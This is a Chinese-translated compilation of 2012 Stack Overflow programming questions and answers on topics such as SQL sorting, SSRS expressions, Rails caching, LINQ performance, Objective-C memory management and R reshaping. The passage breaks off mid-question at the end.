谁能解释为什么`AAAA...`第二条记录会在结果集中？我正在做降序排序，`AAA...`应该出现在最后。如果我将查询更改为

```
Jurisdiction asc 
```

`AAA`在列表中排在倒数第二位，而不是第一条记录。

这是结果集的截图：http: [//i48.tinypic.com/23j5vzq.jpg](http://i48.tinypic.com/23j5vzq.jpg)

我错过了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:09:51.557

这是正确的排序顺序。你有空格。您必须阅读[区分大小写的整理顺序](http://rusanu.com/2012/11/23/case-sensitive-collation-sort-order/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T15:09:44.803

因为，正如您在屏幕截图中看到的那样，它们是“Wise”字之前其他行中的空白（并且空格大于“A”）

您可以使用以下方法[修剪](http://msdn.microsoft.com/en-us/library/ms177827.aspx)此空间：

```
ORDER BY ltrim( Jurisdiction ) desc 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:10:58.093

注意前面的空格，试试

```
SELECT ...
FROM ...
ORDER BY LTRIM(Jurisdiction) desc 
```

`LTRIM`会好的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T15:11:17.767

在屏幕截图上有点难以分辨，但你能检查一下值的长度吗，因为我认为其中一些有前导空格。如果是这样，那么它们将被正确排序。

# magento - Magento，添加计算的自定义字段以供查询以供以后使用

> ID：13822597
> 
> 赞同：0
> 
> 时间：2012-12-11T15:08:23.587
> 
> 标签：magento, magento-1.7

我需要在查询中添加自定义列。我已经看到许多与在网格上添加自定义列相关的 SO 问题，这不是问题。但是我无法在模型上不存在的 select 子句上添加新字段。这是我的代码：

我的`_prepareCollection()`函数中有这个片段：

```
$collection = Mage::getModel('banners/bannersadmin')->getCollection();
$collection->getSelect()
        ->join(array("T"=>$this->_bannersadminTable), "main_table.banner_start_date BETWEEN T.banner_start_date AND T.banner_end_date", array())
        ->where("main_table.bannerID < T.bannerID");

    var_dump((string) $collection->getselect()); 
```

结果查询如下：

```
SELECT `main_table`.*
  FROM `dts_banners_admin` AS `main_table`
 INNER JOIN `dts_banners_admin` AS `T`
    ON main_table.banner_start_date BETWEEN T.banner_start_date AND T.banner_end_date
 WHERE (main_table.bannerID < T.bannerID) 
```

但是我需要这个略有不同的结果，在`aux_value`列中添加了我自己的值，在这种情况下为 1，但可以是我想要的任何其他值。

```
SELECT `main_table`.*, 1 AS `aux_value`
  FROM `dts_banners_admin` AS `main_table`
 INNER JOIN `dts_banners_admin` AS `T`
    ON main_table.banner_start_date BETWEEN T.banner_start_date AND T.banner_end_date
 WHERE (main_table.bannerID < T.bannerID) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:46:54.213

我认为您可以将`Zend_Db_Select::columns()`方法与`Zend_Db_Expr`类结合使用。例如：

```
$select->columns(array(
    'my_value' => new Zend_Db_Expr('1')
)); 
```

# jar - maven 程序集插件：如何从依赖项中提到的 jar 中排除资源

> ID：13822600
> 
> 赞同：0
> 
> 时间：2012-12-11T15:08:31.353
> 
> 标签：jar, resources, external

在创建程序集（未打包的大 jar）时，我需要从依赖项中提到的 jar 中排除资源。我可能会排除特定的罐子，但是否可以从这些罐子中排除资源？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T16:21:01.657

此选项有助于：

```
<unpack>true</unpack>
            <unpackOptions>
                <excludes>
                    <exclude>**/activators/**</exclude>
                </excludes>
            </unpackOptions> 
```

# reporting-services - 如何在复杂的 SSRS 表达式中混合函数？

> ID：13822603
> 
> 赞同：1
> 
> 时间：2012-12-11T15:08:41.017
> 
> 标签：reporting-services, ssrs-2008, dynamics-crm-2011, ssrs-expression

我正在针对在某些列中具有空值的数据存储库编写报告。问题是构建表情像荷尔蒙老太太一样喜怒无常，不喜欢我的功能混合。

这是我编写的表达式，如果字段中的数据为空/无，则该表达式不起作用：

```
=IIF(
    IsNumeric(Fields!ADataField.Value),
    RunningValue(
        IIF(
            DatePart("q", Fields!CreatedOn.Value) = "2",
            Fields!ADataField.Value,
            0
        ),
    Sum,
    Nothing
    ),
    Sum(0)
) 
```

（伪代码）“如果数据有效并且数据是在第二季度创建的，则将其添加到总和中，否则，将其添加到总和中。”

看起来很直接。表达式的各个部分自己工作。IE：IsNumeric()、DatePart() 等。但是当我将它们放在一起时，表达式会引发错误。

我已经尝试了上面显示的所有排列，但都无济于事。Fields!ADataField.Value 中的空值会导致错误。

产生的具体错误：

> “textrun '' 的 Value 表达式对非数字数据使用数字聚合函数。数字聚合函数（Sum、Avg、StDev、Var、StDevP 和 VarP）只能聚合数字数据。”

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:33:43.220

尝试使用这个：

```
=SUM(IIF(ISNothing(Fields!ADataField.Value), 0, 
(IIF(IsNumeric(Fields!ADataField.Value), IIF(DatePart("q", Fields!CreatedOn.Value) = "2", Fields!ADataField.Value, 0), 0)
))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:35:26.520

您可以使用以下方法处理发生的 NULL 值：

```
Iif(Fields!ADataField.Value Is Nothing, 0, Fields!ADataField.Value) 
```

这样你就可以用其他东西替换任何 Null 值（在我上面的示例中为 0）。要将其放入表达式的上下文中，它应该如下所示：

```
=Iif(Fields!ADataField.Value Is Nothing,0,
    RunningValue(
        IIF(
            DatePart("q", Fields!CreatedOn.Value) = "2",
            Fields!ADataField.Value,
            0
        ),
    Sum,
    Nothing
    )
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:49:17.923

SSRS 中表达式中的 VB 不做短路评估。也就是说，一条语句的所有*三个*参数`IIF`都被求值，如果其中任何一个引发异常 ( `#Error`)，那么整个表达式都会引发错误。）

所以无论 ADataField 的值是什么，这部分都会被评估：

```
RunningValue(
        IIF(
            DatePart("q", Fields!CreatedOn.Value) = "2",
            Fields!ADataField.Value,
            0
        ),
    Sum,
    Nothing
    ), 
```

**即使代码无法返回结果**（例如 when`IsNumeric(Fields!ADataField.Value)`为 false） ，也会发生这种情况。

所以你总是要执行 RunningValue 函数，如果 CreatedOn 字段在第 2 季度时 ADataField 中有非数字数据，那么每次调用都会产生错误。

试试这个作为替代方案：

```
=IIF(
    IsNumeric(Fields!ADataField.Value),
    RunningValue(
        IIF(
            DatePart("q", Fields!CreatedOn.Value) = "2"
              AND IsNumeric(Fields!ADataField.Value),
            Fields!ADataField.Value,
            0
        ),
    Sum,
    Nothing
    ),
    Sum(0)
) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T18:57:54.580

大家好。我想出了解决方案。非常感谢所有伟大的建议。在我决定在这里发帖之前，我已经尝试过其中的大多数。因此，健全性检查非常有价值！

无论出于何种不合逻辑的原因，解决此问题的方法是将字段包装在 CInt() 中，即使**在**该字段已被确认为数字之后也是如此。如果没有它，它将不允许 Sum() 对字段运行。这是最终采用的代码：

```
=Sum(
    IIF(
        IsNumeric(Fields!ADataField.Value) And
        DatePart("q", Fields!createdon.Value) = "1",
        CInt(Fields!ADataField.Value),
        0
    )
) 
```

我们在这里尝试过的任何和所有其他排列，包括那些使用 RunningValue() 的排列，在使用 CInt() 包装 IIF() 的“真实”部分后都可以工作。

只是请不要责怪我为什么这样做，但没有它就不行。除了最基本的表达方式之外，任何东西似乎总是极其善变。

再次感谢大家。回答的问题是 GShenanigan 在聊天期间加倍努力。希望我可以把它送给每个人。你们真棒。

# php - 尝试访问嵌入式数组的元素

> ID：13822607
> 
> 赞同：-1
> 
> 时间：2012-12-11T15:09:04.420
> 
> 标签：php, arrays, data-structures

这是一个包含许多嵌入式数组的大型数据结构。每个数组都有 n 个元素，在本例中为 37。我正在尝试访问每个数组的第 1 和第 3 位置的“内容”元素。

数组[1]->百分比->内容

和

数组[3]->等级->内容

$tdata 是包含数据结构的变量。我试过这样循环：

```
$i=0;
  foreach($tdata as $td){

    if($td[$i] == 1 OR $td[$i] == 3){
     var_dump($td[$i])
    }

   $i++;
 } 
```

这是数据结构。

```
array (size=37)

0 => 
 array (size=2)
  'leader' => 
    array (size=2)
       'class' => string '...' (length=18)
       'rowspan' => int 37
   'itemname' => 
     array (size=2)
       'colspan' => int 6
       'content' => string '...' (length=159)
1 => 
  array (size=2)
    'grade' => 
      array (size=2)
        'class' => string '...' (length=25)
        'content' => string '43.37 %' (length=7)
    'percentage' => 
      array (size=2)
        'class' => string '  oddd1 baggb itemcenter ' (length=25)
        'content' => string '43.37 %' (length=7)
2 => 
  array (size=1)
    'leader' => 
      array (size=2)
       'class' => string ' oddd2 b1t b2b b1l' (length=18)
       'rowspan' => int 32
3 => 
  array (size=1)
    'grade' => 
      array (size=2)
        'class' => string '  oddd2 baggb itemcenter ' (length=25)
        'content' => string '6.30 %' (length=6)
  .
  .
  .

array (size=37)
  0 => 
    array (size=2)
      'leader' => 
        array (size=2)
          'class' => string '...' (length=18)
          'rowspan' => int 37
      'itemname' => 
        array (size=2)
          'colspan' => int 6
          'content' => string '...' (length=159)
  1 => 
    array (size=2)
      'grade' => 
        array (size=2)
          'class' => string '...' (length=25)
          'content' => string '26.49 %' (length=7)
      'percentage' => 
        array (size=2)
          'class' => string '  oddd1 baggb itemcenter ' (length=25)
          'content' => string '26.49 %' (length=7)
  2 => 
    array (size=1)
      'leader' => 
        array (size=2)
          'class' => string ' oddd2 b1t b2b b1l' (length=18)
          'rowspan' => int 32
  3 => 
    array (size=1)
      'grade' => 
    array (size=2)
    'class' => string '  oddd2 baggb itemcenter ' (length=25)
    'content' => string '11.12 %' (length=6)
  .
  .
  . 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:19:24.733

```
foreach($tdata as $key => $data ){    
    if( $key === 1 || $key === 3){
     var_dump( $data ); 
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:19:50.380

```
foreach($tdata as $i => $td)
{
    if($i == 1 || $i == 3)
    {
        var_dump($td[$i]);
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:12:43.073

```
$i=0;
  foreach($tdata as $td){

    if($i == 0 || $i == 2){
     var_dump($td[$i])
    }

   $i++;
 } 
```

# ruby-on-rails - 在没有清扫器的情况下清除Rails中缓存的正确方法是什么

> ID：13822614
> 
> 赞同：9
> 
> 时间：2012-12-11T15:09:12.750
> 
> 标签：ruby-on-rails, caching, ruby-on-rails-4

观察者和清扫者从 Rails 4 中移除。很酷。但是缓存和清除缓存的方法是什么？

我读到了俄罗斯娃娃缓存。它很好，但它只涉及视图渲染缓存。它不会阻止数据库被击中。

例如：

```
<% cache @product do %>
  Some HTML code here
<% end %> 
```

您仍然需要`@product`从 db 获取它的`cache_key`. 所以页面或动作缓存对于防止不必要的负载仍然很有用。

我有时可以使用一些超时来清除缓存，但如果记录没有改变怎么办？

至少对于扫地机，您可以控制这方面。什么是/将是做缓存和清除它的**正确方法？**

谢谢 ！:)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-09T10:18:50.233

欢迎来到计算机科学中的两个难题之一，缓存失效 :)

您必须手动处理该问题，因为缓存对象的逻辑与缓存视图不同，缓存视图可以简单地从它显示的对象派生，应该失效是应用程序和情况相关的。

你去这个方法就是`Rails.cache.fetch`方法。`Rails.cache.fetch`接受 3 个参数；缓存键、选项哈希和块。它首先尝试根据 key 读取有效的缓存记录；如果该键存在并且尚未过期，它将从缓存中返回该值。如果它找不到有效的记录，它会从块中获取返回值，并使用您指定的键将其存储在缓存中。

例如：

```
@models = Rails.cache.fetch my_cache_key do
  Model.where(condition: true).all
end 
```

这将缓存块并重用结果，直到某些东西 (tm) 使密钥无效，从而强制重新评估块。还要注意`.all`方法链末尾的 。通常，Rails 会返回一个 ActiveRecord 关系对象，该对象将被缓存，然后在您`@models`第一次尝试使用时对其进行评估，巧妙地避开缓存。该`.all`调用强制 Rails 急切加载记录并确保它是我们缓存的结果，而不是问题。

因此，现在您已打开所有缓存并且不再与数据库通信，我们必须确保覆盖另一端，使缓存无效。这是通过`Rails.cache.delete`简单地获取缓存键并将其删除的方法完成的，这会在您下次尝试获取它时导致丢失。您还可以使用`force: true`fetch 选项来强制重新评估块。哪个适合你。

这一切的科学是在哪里调用`Rails.cache.delete`，在幼稚的情况下，这将是对单个实例的更新和删除以及对集合的任何成员的更新、删除、创建。总会有一些角落案例，它们总是特定于应用程序，所以我在那里帮不了你太多。

我假设在这个答案中您将设置一些健全的缓存存储，例如 memcached 或 Redis。

还要记住将其添加到 config/environments/development.rb：

```
config.cache_store = :null_store 
```

或者你的开发环境会缓存，你最终会因为沮丧而变得无毛。

如需进一步参考，请阅读：[Everyone should be using low level caching in Rails](http://robotmay.tumblr.com/post/23161612605/everyone-should-be-using-low-level-caching) and [The rails API docs](http://api.rubyonrails.org/classes/ActiveSupport/Cache/Store.html)

还值得注意的是，Rails 4 中并没有删除功能，只是将其提取到 gem 中。如果您需要或想要扫地机的全部功能，只需将其添加回您的应用程序，并`gem 'rails-observers'`在您的 Gemfile 中添加一行。该 gem 包含从 Rails 4 核心中删除的清扫器和观察器。

我希望这可以帮助您入门。

# google-chrome - jquery ajax 请求失败并在 chrome 中出现错误（异步：false），但在 FF 中有效

> ID：13822617
> 
> 赞同：1
> 
> 时间：2012-12-11T15:09:17.267
> 
> 标签：google-chrome, firefox, jquery, xmlhttprequest

尝试使用 jQuery 构建一个简单的 AJAX 请求。这是咖啡脚本：

```
$('#ad_id_string').blur(function() {
    var self, idString, adURL;
    self = $(this);
    if (self.val() != "") {
      idString = self.val();
      adURL = "/advertisements/" + idString;
      $.ajax({
        url: adURL,
        type: "GET",
        dataType: "json",
        data: "",
        async: false,
        contentType: "application/json",
        success: function(response, textStatus, jqXHR) {
          console.log(response);
        },
        error: function(jqXHR, textStatus, errorThrown) {
          console.log("Failed - " + textStatus + " : " + errorThrown);
        }
      });
    }
}); 
```

Firefox 执行请求没有问题，并且 JSON 按预期返回。但是，Chrome 甚至拒绝发送请求。相反，它给出了这个错误：`NETWORK_ERR: XMLHttpRequest Exception 101`

我试过设置`async:true`而不是`false`，以及`async`一起删除参数。这只会导致 chrome 在发送之前使请求失败，而不会出现任何类型的错误。我的 Q/A 人员将在 Chrome 或 Safari 中对此进行测试，因此它需要在这些浏览器中运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:03:39.453

看起来这与我的 Chrome 版本（23.0.1271.97）和有问题的 url 有关。我正在使用 Rails，所以我点击了`http://localhost:3000`，Chrome 在传递带有端口号的 AJAX 请求时遇到问题。

# facebook - 致命错误：未捕获异常：102：会话密钥无效或不再有效

> ID：13822623
> 
> 赞同：2
> 
> 时间：2012-12-11T15:08:57.877
> 
> 标签：facebook, session, facebook-graph-api, exception, key

自昨天（12 月 10 日）以来，我的许多应用程序都停止了执行 facebook 调用。例如调用检查登录用户是否喜欢一个页面或获取登录用户的所有相册。我使用php sdk！我收到的所有电话：

*致命错误：未捕获的异常：102：会话密钥无效或不再有效在 yyy 行的 /xxxx/ 中抛出*

我的 facebook 对象是正确的，我收到了一个有效的用户 ID，其中 $facebook->getUser();

检查用户是否是粉丝的示例：

```
$likes = $facebook->api('/'.$user.'/likes/154125631364512&access_token='.$facebook->getAccessToken()); 
```

或者例如从登录用户（fql）获取所有相册：

```
$fql = "SELECT aid, object_id, cover_pid, name, size FROM album WHERE owner= '".$facebook->getUser()."'";
$userAlbums = $facebook->api(array('method' => 'fql.query', 'query' => $fql)); 
```

或者例如，从相册中获取所有图片：

```
$params['fields'] = 'name,source,images,picture,height,width';
$params = http_build_query($params, null, '&');
$data['albumPhotos'] = $facebook->api("/album_object_id/photos?".$params); 
```

所有电话都工作了数周，但自从 Facebook 崩溃后突然中断。任何人都知道为什么这些电话突然失败？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:32:29.133

检查这个：[https](https://developers.facebook.com/bugs/181323008674971?browse=search_50c7385f82da62c58502145) ://developers.facebook.com/bugs/181323008674971?browse=search_50c7385f82da62c58502145你应该更新你的PHP SDK，但即使这样做，我仍然有问题；让我们希望他们尽快解决这个烦人的问题。

# objective-c - 如何在objective-c中切换两个对象

> ID：13822632
> 
> 赞同：0
> 
> 时间：2012-12-11T15:07:25.177
> 
> 标签：objective-c

我试图找出objective-c中的两个矩形之间是否发生碰撞。我认为实现这一点的一种方法是检测最接近 0,0 点的矩形，然后做剩下的工作。

我写了一个函数，它接受两个矩形对象作为参数，并进行数学计算来计算面积、到原点的距离等......

因此，假设 rect1 位于 (100,200) 且 rect1 的宽度为 100 高度 200，rect2 位于 150,150 且 rect2 的宽度为 100 高度 200，这是由函数计算得足够好。

如果我切换 rec1 和 rect2 属性，那么 rect1 将是 150,150，而 rect2 将是 100,200。并调用以下函数

```
-(Rectangle*)intersect:(Rectangle*)rectA:(Rectangle*)rectB{    
    //check closest rectangle to 0,0 and switch rectangles
    if (rectA.origin.x>rectB.origin.x) {
        Rectangle *temporary = [[Rectangle alloc] init];
        temporary=rectA;
        rectA=rectB;
        rectB=temporary;
        [temporary release];
    }

    float rectAX = rectA.origin.x;
    float rectAY = rectA.origin.y;

    float rectBX = rectB.origin.x;
    float rectBY = rectB.origin.y; 
```

当我启用保护 malloc 和僵尸时，出现以下错误： **-[Rectangle origin]: message sent to deallocated instance 0x100acffd0**

一旦`rectA.origin.x;`被调用，我就会得到错误。

那么 rectA 或 rectB 是如何被释放的呢？切换具有一堆属性的两个对象的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:12:33.060

有一个用于比较 CGRects 的内置函数`CGRectIntersectsRect(rectA, rectB)`，您可以使用它来检查矩形的框架:)

至于您的切换代码，您已经通过分配临时创建了第三个对象。然后将临时指针设置在 rectA 处，然后在最后释放 rectA，因为它指向临时。将新创建的对象作为泄漏，然后将消息发送到释放的 rectA。

如果您可以根据我的经验提供帮助，您真的不想像那样交换对象指针。但是，如果您绝对必须并了解正在发生的事情，您可以这样做：

```
// Create copies of your objects
Rectangle *rectACopy = [rectA copy];
Rectangle *rectBCopy = [rectB copy];

// release the originals.
[rectA release];
[rectB release];

// Set your copies to the original pointers.
rectA = rectBCopy;
rectB = rectACopy; 
```

**NSCopying 协议**

首先你需要实现协议。

```
@interface Rectangle : NSObject <NSCopying> 
```

然后您需要创建新方法。这将创建一个新对象，但具有所有相同的值。

```
- (id)copyWithZone:(NSZone *)zone
{
    id copy = [[[self class] alloc] init];

    if (copy) {
        // Copy NSObject based properties like UIViews, NSArrays, Subclassed objects.
        [copy setObjectProperty:[self.objectProperty copy]];

        // Set primitives like ints, CGRects, Bools.
        [copy setPrimitiveProperty:self.primitiveProperty];
    }

    return copy;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:18:51.190

您不需要为其分配新的对象实例`temporary`（因此您也不需要释放它）。你只是拿你的 2 个现有指针并切换它们。使用第三个变量 ( `temporary`) 是正确的，但您不需要分配任何新空间，因为您没有在内存中移动任何内容，只是交换哪些变量指向现有对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T15:30:30.670

```
-(Rectangle*)intersect:(Rectangle*)rectA:(Rectangle*)rectB{    
    //check closest rectangle to 0,0 and switch rectangles
    if (rectA.origin.x>rectB.origin.x) {
        //Rectangle *temporary = [[Rectangle alloc] init]; // here you don't need to allocate as you are not using this object
        // So use 
        Rectangle *temporary=rectA;
        rectA=rectB;
        rectB=temporary;
        //[temporary release]; //you don't need this. Here you were releasing rectA not the temp rect that you allocated just below if, as you assign rectA to temporary
    }

    float rectAX = rectA.origin.x;
    float rectAY = rectA.origin.y;

    float rectBX = rectB.origin.x;
    float rectBY = rectB.origin.y; 
```

# c# - 以编程方式将图像添加到 LinkBut ton

> ID：13822637
> 
> 赞同：0
> 
> 时间：2012-12-11T15:10:12.173
> 
> 标签：c#, asp.net

我想以编程方式将图像插入到 LinkBut​​ton，如下面的 aspx 代码：

```
 <asp:LinkButton runat="server" ><img src="NewImages/tick.jpg" runat= "server" /></asp:Linkbutton> 
```

我正在尝试以下代码：

```
 LinkButton bb = (System.Web.UI.WebControls.LinkButton)pagerTable.Rows[0].Cells[0].Controls[0];
    bb.Attributes.Add("img", "NewImages/tick.jpg"); 
```

PS 请不要告诉我使用 ImageButton :)。使用这个是有原因的

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:14:57.320

你需要做一些事情

```
bb.Controls.Add(new Image { ImageUrl = "NewImages/tick.jpg" }); 
```

即创建一个[`Image`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.image.aspx)控件并将其添加到`LinkButton`的子控件中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:14:32.000

你可以这样使用

```
<asp:LinkButton ID="LinkButton1" runat="server" />

LinkButton1.Text = "<img src='NewImages/tick.jpg'/>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:14:54.047

你可以试试这个：

```
LinkButton bb = (System.Web.UI.WebControls.LinkButton)pagerTable.Rows[0].Cells[0].Controls[0];
               HtmlImage i =  bb.Controls[0] as HtmlImage;
            i.Src = "~/NewImages/tick.jpg"; 
```

# java - Java 结果集

> ID：13822640
> 
> 赞同：0
> 
> 时间：2012-12-11T15:09:33.620
> 
> 标签：java, oracle

我正在使用 Eclipse SDK 3.2.0，并且正在使用 Java 连接到 Oracle 11g。我正在使用一个简单的 JDBC 连接。我将查询的数据分配给结果集函数。我可以使用 rs.getstring 一次获取一列。如何使用 rs.next() 在我的“while”循环中一次打印所有列？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:16:51.197

关于什么：

```
while(rs.next()) {
  for (int i = 0; i < rs.getMetaData().getColumnCount(); i++) {
    System.out.println("col-nr: %d - %s", i, rs.getString(i));
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:22:08.633

我猜你想获取所有列数据。你可以试试 ResultSetMetaData 类。

```
ResultSet rs = xxx;
ResultSetMetaData rsmd =rs.getMetadata(); 
```

# python - 值属性，为什么有时需要？

> ID：13822642
> 
> 赞同：1
> 
> 时间：2012-12-11T15:10:29.547
> 
> 标签：python

我在玩 python 和 cgi，想知道为什么下面两个示例之间存在差异：

**示例 1**（部分）

```
form = cgi.FieldStorage()
for field in form.keys():
    sys.stdout("%s ----> %s<br />" % (field, form[field].value)) 
```

**示例 2**

```
form = {'one': '1', 'two': '2', 'three': '3'}
for field in form.keys():
    sys.stdout("%s ---> %s\n" % (field, form[field])) 
```

为什么`.value`在第一个示例中需要该属性，而在第二个示例中您不需要它返回键的值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:12:51.170

这取决于`form`字典中存储的内容。

在示例 1 中，它是一些相当复杂的对象，显然无法以所需的方式转换为字符串。

示例 2 的 dict 条目只是字符串，因此可以直接使用它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:16:55.853

在第一个例子中。

```
form = cgi.FieldStorage() 
```

form 现在是一个类型的对象，`FieldStorage`该对象可以像字典 ( `object[key]`) 一样访问，并且它将返回一个对象，但是，与示例 2 中仅包含字符串的普通字典不同。在示例 1 的类似字典的访问中返回的对象必须被告知您希望如何显示或访问它，在这种情况下，您需要 objects `value`。

为了更好地理解这一点，您可以尝试一些即时调试。

通过迭代其中的项目，`cgi.FieldStorage()`您可以看到它们是什么类型的对象。也许尝试玩一个单独的对象，看看它是如何工作的？

顺便说一句，如果对象具有`__str__`功能，您可能不需要`.value`更多信息，您可以阅读有关[类](http://docs.python.org/2/reference/datamodel.html#new-style-and-classic-classes)和[`__str__`](http://docs.python.org/2/reference/datamodel.html#object.__str__)

# c# - LINQ 查询耗时过长

> ID：13822646
> 
> 赞同：3
> 
> 时间：2012-12-11T15:10:44.517
> 
> 标签：c#, sql, linq, entity-framework

我正在运行这个查询：

```
List<RerocdByGeo>  reports = (from p in db.SOMETABLE.ToList()
       where (p.colID == prog && p.status != "some_string" && p.col_date < enddate && p.col_date > startdate)
       group p by new {
           country = (
           (p.some_integer_that_represents_an_id <= -0) ? "unknown" : (from f in db.A_LAGE_TABLE where (f.ID ==  p.some_integer_that_represents_and_id) select f.COUNTRIES_TABLE.COU_Name).FirstOrDefault()),
           p.status }
           into g
    select new TransRerocdByGeo
       {
           ColA = g.Sum(x => x.ColA),
           ColB = g.Sum(x => x.ColB),
           Percentage = (g.Sum(x => x.ColA) != null && g.Sum(x => x.ColA) != 0) ? (g.Sum(x => x.ColB) / g.Sum(x => x.ColA)) * 100 : 0,
           Status = g.Key.status,
           Country = g.Key.country
       }).ToList(); 
```

sql 中针对同一数据库的类似查询将运行几秒钟，而在好的情况下，这个查询大约需要 30-60 秒...

表 SOMETABLE 包含大约 10-60 K 行，此处称为 A_LARGE_TABLE 的表包含大约 10-20 行

coulmn some_inteher_that_reoresents_an_id 是大表上的 id，但也可以是 0 或 -1，并且需要获取“未知”值，所以我无法建立关系（或者我可以吗？如果可以，请解释）

COUNTRIES_TABLE 包含 100-200 行。

coulID 和 ID 是身份列...

有什么建议么 ？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-12-11T15:14:35.590

你`ToList`在一开始就在调用“SOMETABLE”。这是将包含所有行和所有列的整个数据库表拉入内存，然后通过 Linq-to-objects 对该内存数据结构执行所有后续操作。

您不仅会遭受通过网络传输比您需要的更多信息的惩罚（这很慢），而且 C# 无法像数据库一样高效地执行操作。这部分是因为它失去了对任何索引、任何数据库缓存、任何缓存的编译查询的访问权限，它在处理一开始就很大的数据集以及查询本身的任何更高级别的优化方面效率不高（数据库往往会这样做）很多）。

接下来，您的`GroupBy`子句中有一个查询，该查询**针对序列中的每一行**`from f in db.A_LAGE_TABLE where [...]`执行。如果在可能会优化的数据库级别评估整个查询，即使不是，您也不会通过网络*为每条记录*传递信息（这很慢） 。

 **** * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-12-11T15:15:07.443

```
from p in db.SOMETABLE.ToList() 
```

这基本上是说“从 SOMETABLE 获取每条记录并将其放入一个`List`”中，根本没有过滤。这可能是你的问题。***

# visual-studio - 测试，VS2010。如何摆脱 Nightly、NightlyMemCheck 等？

> ID：13822651
> 
> 赞同：3
> 
> 时间：2012-12-11T15:10:51.603
> 
> 标签：visual-studio, cmake, ctest

我在 Visual Studio 2010 中使用 CMake 和 CTest。

`ENABLE_TESTING()`几秒钟后，`ADD_TEST()`我的解决方案包含名称为“连续”、“实验”等的项目。

我不需要全部。而且，我要把所有的代码都传给一个对CMake不是很熟悉的人，怕这个丰富会迷惑和误导他。

所以，我想只留下 RUN_TESTS 项目并摆脱所有其他测试项目。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T15:59:34.397

[`include(CTest)`](https://cmake.org/cmake/help/latest/module/CTest.html)仔细检查您的 CMake 列表文件中是否没有任何内容。包含此 CMake 模块会创建目标*Continuous*，*Experimental*，...作为副作用。调用[enable_testing](https://cmake.org/cmake/help/latest/command/enable_testing.html)足以获得`RUN_TESTS`目标。

# java - Eclipse 有什么好的 SVN 工具可以同时管理多个存储库吗？

> ID：13822654
> 
> 赞同：0
> 
> 时间：2012-12-11T15:10:56.400
> 
> 标签：java, eclipse, svn, eclipse-plugin, multiple-repositories

我在 Eclipse 中为 svn 使用 subclipse，但是它无法管理多个存储库，我不得不断开连接并再次连接，断开连接并再次连接以传输我的应用程序的不同版本。现在的结果是我丢失了我的最新版本，我被这个旧版本卡住了，项目中有项目等等。这一切都是一团糟。我需要某种工具来管理多个存储库并允许您选择要提交到哪个存储库...

有什么解决办法吗？我需要一个更好的 SVN 工具...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:15:15.283

您可以尝试使用 SVN 作为 Eclipse 之外的单独工具。这不是最优雅的方法，但可以让您更好地控制自己的工作。

# php - preg_split() 2 个字母和小数

> ID：13822656
> 
> 赞同：-2
> 
> 时间：2012-12-11T15:10:58.250
> 
> 标签：php, regex, preg-split

我有一个字符串，这个字符串应该是一个数组。

但是前 2 个字母是可变的，我需要接下来的 5 个数字（无论是否为空）。最后 5 位是带小数点的数字或空 ( `$string="AB3 . ";`)

一个例子：

```
$string = "AB10.00";

$arr[0] = "AB";
$arr[1] = "10.00"; 
```

我想用`preg_split()`这个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:13:38.823

你的意思是`substr()`？

```
$string = "AB10.00";
$arr[0] = substr($string, 0, 2); // $arr[0] == 'AB'
$arr[1] = substr($string, 2); // $arr[1] == '10.00' 
```

# r - dcast 功能出错

> ID：13822665
> 
> 赞同：0
> 
> 时间：2012-12-11T15:11:28.380
> 
> 标签：r

我有一个`long`格式的df。这是一个示例：

```
 Dates   Names      Point.Forecast
1 2000-03-01 MSCI ACWI     0.16309946
2 2000-04-03 MSCI ACWI     0.21412161
3 2000-05-01 MSCI ACWI     0.04679327
4 2000-03-01 DJGlbl        0.1810070
5 2000-04-03 DJGlbl        0.1293746
6 2000-05-01 DJGlbl        0.7411549
7 2000-03-01 IBOXX         0.2861171
8 2000-04-03 IBOXX         0.25387063
9 2000-05-01 IBOXX         0.29944246

str(df)
'data.frame':   3408 obs. of  3 variables:
 $ Dates         : chr  "2000-03-01" "2000-04-03" "2000-05-01" "2000-06-01" ...
 $ Names         : chr  "MSCI ACWI" "MSCI ACWI" "MSCI ACWI" "MSCI ACWI" ...
 $ Point.Forecast: num  0.1631 0.2141 0.0468 -0.1833 0.252 ... 
```

我想将它转换为`wide`格式，所以它看起来像：

```
 Dates        MSCI ACWI      DJGlbl         IBOXX 
2000-03-01    0.16309946     0.21412161     0.04679327
